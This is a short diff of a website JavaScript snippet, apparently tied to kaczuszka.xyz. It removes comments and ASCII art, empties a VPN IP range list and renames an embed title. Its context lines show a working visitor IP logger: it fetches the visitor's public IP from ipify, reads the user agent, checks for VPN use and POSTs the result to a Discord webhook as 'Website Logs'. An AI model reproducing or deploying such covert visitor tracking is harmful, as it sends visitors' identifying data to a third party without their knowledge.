@@ -17,8 +17,7 @@ fetch('https://api.ipify.org/?format=json')
     var computerName = navigator.userAgent;
 
     var vpnIpRanges = [
-      // Add known VPN IP ranges here
-      // For example: '1.2.3.0/24', '4.5.6.0/24', ...
+
     ];
 
     var isVPN = vpnIpRanges.some(function(range) {
@@ -30,7 +29,7 @@ fetch('https://api.ipify.org/?format=json')
     var message = {
       embeds: [
         {
-          title: 'Website Logs',
+          title: 'Website Logs!',
           color: 3447003,
           fields: [
             {
@@ -53,7 +52,6 @@ fetch('https://api.ipify.org/?format=json')
       ]
     };
 
-    // Send the message to the Discord webhook
     fetch(webhook, {
       method: 'POST',
       headers: {
@@ -76,16 +74,6 @@ function ipToNumber(ip) {
     return (result << 8) + parseInt(octet, 10);
   }, 0);
 }
-
-const ART = [
-  `
-  \\
-  (o>
-\\_//)  kaczuszka.xyz
-\_/_)
-_|_
-  `
-]
 
 const SEARCHES = [
   'kaczuszka',
